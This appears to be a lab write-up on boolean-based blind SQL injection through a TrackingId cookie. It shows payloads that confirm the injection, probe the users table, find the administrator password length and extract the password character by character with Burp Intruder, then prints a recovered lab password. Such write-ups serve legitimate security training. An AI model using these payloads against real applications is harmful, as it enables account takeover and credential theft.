# Objective

Extract the administrator's password using only **True/False (Boolean)** responses.

The application behaves like this: 

- ✅ **Condition is TRUE** → "Welcome back" is shown.
- ❌ **Condition is FALSE** → "Welcome back" disappears.

This makes it possible to ask the database a series of yes/no questions.

---

# Step 1: Verify the Injection Point

Original cookie:

```
TrackingId=xyz
```

Modify it to:

```sql
TrackingId=xyz' AND 1=1--
```

<img width="1278" height="741" alt="Screenshot 2026-08-08 at 9 25 59 PM" src="https://github.com/user-attachments/assets/f9469b07-17d0-4df3-8c5a-eac93d4aa23b" />


### SQL Example

Suppose the application executes:

```sql
SELECT trackingid
FROM tracking
WHERE trackingid='xyz'
```

After injection:

```sql
SELECT trackingid
FROM tracking
WHERE trackingid='xyz'
AND '1'='1'
```

Since:

```sql
'1'='1'
```

is **TRUE**, the query still returns a row.

Result:

```
Welcome back
```

---

# Step 2: Test a False Condition

Now send:

```sql
TrackingId=xyz' AND 1=2--
```

The SQL becomes:

```sql
WHERE trackingid='xyz'
AND '1'='2'
```

Since:

```sql
'1'='2'
```

is **FALSE**, no row matches.

Result:

```
Welcome back disappears
```

<img width="1279" height="768" alt="Screenshot 2026-08-08 at 9 26 44 PM" src="https://github.com/user-attachments/assets/db3a9074-0d9f-4c7b-89d4-420e85b3ed2f" />



This confirms that the application's response changes based on the truth of the injected condition.

---

# Step 3: Check Whether the `users` Table Exists

Payload:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

### Explanation

The subquery:

```sql
SELECT 'a'
FROM users
LIMIT 1
```

returns:

```
a
```

if the `users` table exists and contains at least one row.

The comparison:

```sql
'a'='a'
```

is **TRUE**, so "Welcome back" appears.

<img width="1273" height="714" alt="Screenshot 2026-08-08 at 9 27 57 PM" src="https://github.com/user-attachments/assets/5853b2b8-29b5-4bee-9224-6e8586cea297" />


If the table didn't exist, the query would fail or evaluate as false.

---

# Step 4: Check Whether the `administrator` User Exists

Payload:

```sql
TrackingId=xyz' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
```

If a row exists where:

And another payload:

Payload:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
```

If a row exists where:

```
username = administrator
```

the subquery returns:

```
a
```

Comparison:

```sql
'a'='a'
```

is **TRUE**.

So:

```
Welcome back
```

appears.

---

<img width="1275" height="766" alt="Screenshot 2026-08-08 at 9 29 34 PM" src="https://github.com/user-attachments/assets/6737c3fb-dc4a-4792-963b-0c5b3efdd70c" />


# Step 5: Determine the Password Length

Start with:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator'
AND LENGTH(password)>1)='a'--
```


<img width="1277" height="767" alt="Screenshot 2026-08-08 at 9 31 36 PM" src="https://github.com/user-attachments/assets/d3bb829d-76cf-4f0a-8647-47b76a90877a" />


Suppose the password is:

```
k8m4z7...
```

with **20 characters**.

Then:

```sql
LENGTH(password)>1
```

is **TRUE**.

Continue increasing the number:

```sql
LENGTH(password)>2
```

```sql
LENGTH(password)>3
```

```sql
LENGTH(password)>4
```

...

Eventually:

```sql
LENGTH(password)>20
```

becomes:

```
20 > 20
```

which is **FALSE**.

At this point, "Welcome back" disappears.

From this you infer:

```
Password length = 20
```

---

# Step 6: Extract the Password One Character at a Time

Now use:

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

### Explanation

Assume the password is:

```
m7g4x...
```

`SUBSTRING(password,1,1)` returns:

```
m
```

The condition becomes:

```sql
'm'='a'
```

which is **FALSE**.

So no "Welcome back".

---

Try:

```sql
'm'='b'
```

False.

---

Continue:

```sql
'm'='c'
```

False.

---

Eventually:

```sql
'm'='m'
```

becomes **TRUE**.

Now:

```
Welcome back
```

appears.

You have discovered:

```
Character 1 = m
```

---

# Step 7: Use Burp Intruder instead

Testing every character manually would be slow.

Instead:

1. Send the request to **Intruder**.
2. Highlight only the test character (for example, the final 1).
3. Click **Add §**.
4. Attack Type: Sniper

You get:

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator'
AND LENGTH(password)>**§**1**§**)='a'--

```

The `§...§` markers tell Intruder where to insert payloads.

---

# Step 8: Configure Payloads

Choose Payload type: Numbers

Add:

```

0
1
2
...
9
```

This covers digits.

1. Number Range: from- 1 to 25 & Step 1


<img width="1276" height="768" alt="Screenshot 2026-08-08 at 8 59 28 PM" src="https://github.com/user-attachments/assets/c550d829-e43c-4091-8201-360f254abff3" />
<img width="1278" height="768" alt="Screenshot 2026-08-08 at 8 59 07 PM" src="https://github.com/user-attachments/assets/a0933ebe-c2cc-403f-a0f2-26316dfb0384" />




# Step 9: Extract the Password

Now use:

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

---

# Step 10: Use Burp Intruder

Testing every character manually would be slow.

Instead:

1. Send the request to **Intruder**.
2. Highlight only the test character (for example, the final `a`).
3. Click **Add §**.
4. Attack Type: Cluster Bombs

You get:

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'--

```
The `§...§` markers tell Intruder where to insert payloads.

<img width="1271" height="767" alt="Screenshot 2026-08-08 at 9 15 23 PM" src="https://github.com/user-attachments/assets/fa9bb67f-bfa8-4820-969a-223a8c34951b" />

<img width="1277" height="769" alt="Screenshot 2026-08-08 at 9 15 06 PM" src="https://github.com/user-attachments/assets/461a9ce0-19c3-440a-991e-23801b6e6d8e" />

<img width="1279" height="738" alt="Screenshot 2026-08-08 at 9 14 44 PM" src="https://github.com/user-attachments/assets/032b16f2-d86c-4709-8162-9b71c2901b4a" />

or

# Attempt simgle time one by one
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§'--

```
The `§...§` markers tell Intruder where to insert payloads.

<img width="1279" height="768" alt="Screenshot 2026-08-08 at 9 20 13 PM" src="https://github.com/user-attachments/assets/196c77b4-fe5a-475e-b0c9-500ddfd024f6" />

<img width="1277" height="767" alt="Screenshot 2026-08-08 at 9 19 08 PM" src="https://github.com/user-attachments/assets/ee045780-2483-4527-ae83-98b6dec4f877" />


# Next replace 1 by 2/3/4/5......

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='**§**a**§**'--

```

<img width="1280" height="767" alt="Screenshot 2026-08-08 at 9 23 43 PM" src="https://github.com/user-attachments/assets/81c65169-941c-4feb-b36a-7042130144e4" />

<img width="1277" height="765" alt="Screenshot 2026-08-08 at 9 22 34 PM" src="https://github.com/user-attachments/assets/7f527585-1fcb-4f56-a3d4-f24c398fbef6" />


---

# Step 11: Configure Payloads

Payload 1-1: Numbers 1-25

Payload 1-a: Brute Force. (Max Length 1 & Min 1)

Add:

```
a
b
c
...
z
0
1
2
...
9
```

This covers lowercase letters and digits.

---

# Step 12: Grep for "Welcome back"

Configure **Grep - Match** with:

```
Welcome back
```

Password

```
t9e107uapbezcb55vl4y
```

---

# Step 13: Log In

---

Once all 20 characters are recovered:

1. Go to **My Account**.
2. Enter:

```
Username:
administrator
```

```
Password:
(recovered password)
```

1. Log in to complete the lab.
